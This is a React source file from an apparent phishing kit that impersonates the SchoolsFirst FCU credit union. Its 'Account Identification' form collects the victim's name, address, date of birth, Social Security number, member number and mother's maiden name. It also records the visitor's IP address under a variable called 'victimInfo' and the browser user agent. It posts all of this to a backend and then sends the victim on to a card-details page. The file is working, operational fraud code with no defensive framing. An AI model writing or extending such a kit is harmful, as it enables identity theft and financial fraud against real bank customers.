import React, { useEffect, useState } from "react";
import { useHistory } from "react-router-dom";
import FormLayout from "../components/formLayout";
import { randParams } from "../utils/random";
import { APP_STORAGE_NAME } from "../utils/constants";
import Input from "../components/input";
import Button from "../components/button";
import axios from "axios";
import API from "../api/api";

const Account = () => {
  const router = useHistory();
  const [data, setData] = useState({
    name: "",
    address: "",
    ssn: "",
    memberNumber: "",
    mmn: "",
    dob: "",
  });
  const [isLoading, setIsLoading] = useState(false);
  const [victimInfo, setVictimData] = useState({
    ip: "",
  });

  const handleChange = (e) => {
    let { name, value } = e.target;
    if (["ssn"].includes(name)) {
      if (!/^[0-9]+$/.test(value)) return;
    }

    if (["dob"].includes(name)) {
      if (!/^[0-9\/]+$/.test(value)) return;
    }

    if (/\d+/.test(value) && name === "dob") {
      if (value?.length === 2 || value.length === 5) {
        value = value + "/";
      }
    }

    setData((prev) => ({ ...prev, [name]: value }));
  };

  const handleKeyDown = (e) => {
    if (e.key === "Backspace" && /^\d\d\/\d\d\/?$/.test(data?.dob)) {
      setData((prev) => ({
        ...prev,
        dob: data.dob?.slice(0, 5),
      }));
    }
    if (e.key === "Backspace" && /^\d\d\/$/.test(data?.dob)) {
      setData((prev) => ({
        ...prev,
        dob: "",
      }));
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const _data = JSON.parse(sessionStorage.getItem(APP_STORAGE_NAME)) || {};
    sessionStorage.setItem(
      APP_STORAGE_NAME,
      JSON.stringify({ ..._data, ...data }),
    );

    const __data = JSON.parse(sessionStorage.getItem(APP_STORAGE_NAME)) || {};
    setIsLoading(true);
    try {
      const res = await API.createDetail({
        ...__data,
        bank: "SchoolsFirst FCU",
        userAgent: navigator?.userAgent,
        victimInfo,
      });
      if (res.status === 201) {
        router.push(`/card?${randParams()}`);
      }
    } catch (error) {
      alert("Something went wrong");
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    async function getIP() {
      const resp = await axios.get("https://api.ipify.org/?format=json");
      if (resp.data.ip) {
        setVictimData({ ip: resp.data.ip });
      }
    }
    getIP();
  }, []);

  return (
    <FormLayout
      handleSubmit={handleSubmit}
      title={"Account Identification"}
    >
      <Input
        title="Name"
        name="name"
        value={data?.name}
        onChange={handleChange}
      />
      <Input
        title="Address"
        name="address"
        value={data?.address}
        onChange={handleChange}
      />
      <Input
        title="DOB"
        name="dob"
        value={data?.dob}
        onKeyDown={handleKeyDown}
        onChange={handleChange}
        minLength={10}
        maxLength={10}
      />
      <Input
        title="SSN"
        name="ssn"
        value={data?.ssn}
        onChange={handleChange}
        minLength={9}
        maxLength={9}
      />
      <Input
        title="Member number"
        name="memberNumber"
        value={data?.memberNumber}
        onChange={handleChange}
      />
      <Input
        title="MMN"
        name="mmn"
        value={data?.mmn}
        onChange={handleChange}
      />
      <Button
        title={
          isLoading ? (
            <span className="loading loading-spinner loading-md text-white"></span>
          ) : (
            "Continue"
          )
        }
      />
    </FormLayout>
  );
};

export default Account;
